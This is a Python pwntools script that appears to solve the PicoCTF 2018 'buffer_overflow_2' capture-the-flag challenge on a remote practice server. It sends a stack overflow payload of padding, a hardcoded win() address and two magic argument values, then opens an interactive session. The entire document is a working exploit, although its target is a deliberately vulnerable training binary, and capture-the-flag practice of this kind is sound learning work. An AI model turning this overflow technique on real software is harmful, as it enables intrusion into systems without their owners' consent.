#coding:utf-8
from pwn import *
import pwnlib
# sh = process("./PicoCTF_2018_buffer_overflow_2")
sh = remote("node3.buuoj.cn",26310)
win_addr = 0x80485CB
payload = 'a' * 112 + p32(win_addr) * 2 + p32(0xDEADBEEF) + p32(0xDEADC0DE)
sh.sendline(payload)
sh.interactive()